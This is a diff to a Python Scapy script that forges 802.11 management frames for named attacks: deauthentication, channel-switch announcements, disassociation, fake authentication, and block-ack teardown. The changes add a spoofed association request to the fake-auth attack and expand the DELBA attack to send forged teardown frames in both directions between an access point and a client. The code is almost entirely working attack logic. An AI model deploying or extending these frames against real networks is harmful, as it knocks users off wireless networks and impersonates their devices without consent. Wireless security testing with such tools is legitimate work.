@@ -38,7 +38,7 @@ parser.add_argument('--switch-channel', dest="channel", nargs="?", type=int,
 parser.add_argument('--deauth-reason', dest="reason", nargs="?", type=int, help='deauth reason code,default 3')
 
 parser.add_argument('--auth-algorithm', dest="auth_algorithm", nargs="?", type=int,
-                    help='fake authentication algorithm,0 is open auth,1 is pre share key, default 0')
+                    help='fake authentication algorithm,0 is open auth,1 is pre share key, default 1')
 
 args = parser.parse_args()
 
@@ -47,7 +47,6 @@ ifc = args.iface
 interval = args.interval
 ap_mac = args.ap_bssid
 cli_mac = args.client_mac
-ssid = args.ap_ssid
 send_count = args.count
 broadcast = "FF:FF:FF:FF:FF:FF"
 if not cli_mac:
@@ -55,13 +54,17 @@ if not cli_mac:
 if not interval:
     interval=0
 # beacon frame
+ssid = args.ap_ssid
 tag_num_ssid = 0
 tag_num_csa = 37
 tag_num_quiet = 40
 support_rates = args.rate
 channel = args.channel
+if not ssid:
+    ssid=""
 if not support_rates:
-    support_rates = [0x82, ]
+    # support_rates = [0x82,0x84,0x8b,0x96,0x24,0x30,0x48,0x6c]
+    support_rates = [0x82,]
 
 # deauth
 reason = args.reason
@@ -70,7 +73,7 @@ if not reason:
 #fake auth
 auth_algorithm = args.auth_algorithm
 if not auth_algorithm:
-    auth_algorithm=0
+    auth_algorithm=1
 
 
 def beacon_frame():
@@ -83,6 +86,7 @@ def switch_channel_annountation():
     if not channel:
         print("channel must provide in csa")
         sys.exit(1)
+
     return beacon_frame() / Dot11Elt(ID=tag_num_csa, len=3, info=bytes([0, channel, 1]))
 
 
@@ -98,20 +102,42 @@ def disassociation():
 
 
 def fake_auth():
-    return RadioTap() / Dot11(addr1=ap_mac, addr2=cli_mac, addr3=ap_mac, addr4=cli_mac) / Dot11Auth(algo=auth_algorithm, seqnum=1,
-                                                                                                    status=0)
+    return [
+        RadioTap() / Dot11(addr1=ap_mac, addr2=cli_mac, addr3=ap_mac, addr4=cli_mac) / Dot11Auth(algo=auth_algorithm,
+                                                                                                 seqnum=1,
+                                                                                                 status=0),
+
+        RadioTap() / Dot11(addr1=ap_mac, addr2=cli_mac, addr3=ap_mac, addr4=cli_mac) / Dot11AssoReq() / \
+        Dot11Elt(ID=tag_num_ssid, len=len(ssid), info=bytes(ssid, 'utf-8')) / Dot11EltRates(rates=support_rates),
+    ]
+
+
+
 
 def del_block_ack():
+    tid=0
     class Dot11DELBA(Packet):
         name = "802.11 DELBA"
         fields_desc = [
             ByteField("category", 3),
             ByteField("action", 2),
-            LEShortField("param", 0),
+            ShortField("param", 0),
            LEShortField("reason", 0),
         ]
 
-    return RadioTap() / Dot11(addr1=ap_mac, addr2=cli_mac, addr3=ap_mac,type=0,subtype=13) / Dot11DELBA(param=0,reason=37)
+    return[
+        RadioTap() / Dot11(addr1=ap_mac, addr2=cli_mac, addr3=ap_mac, type=0, subtype=13) / Dot11DELBA(param=(1<<3)+(tid<<4),
+                                                                                                       reason=37),
+        RadioTap() / Dot11(addr1=ap_mac, addr2=cli_mac, addr3=ap_mac, type=0, subtype=13) / Dot11DELBA(param=(0<<3)+(tid<<4),
+                                                                                                       reason=37),
+
+        RadioTap() / Dot11(addr1=cli_mac, addr2=ap_mac, addr3=ap_mac, addr4=ap_mac, type=0, subtype=13) / Dot11DELBA(
+            param=(1 << 3) + (tid << 4),
+            reason=37),
+        RadioTap() / Dot11(addr1=cli_mac, addr2=ap_mac, addr3=ap_mac, addr4=ap_mac, type=0, subtype=13) / Dot11DELBA(
+            param=(0 << 3) + (tid << 4),
+            reason=37),
+    ]
 attack = {
     "deauth": deauth,
     "csa": switch_channel_annountation,
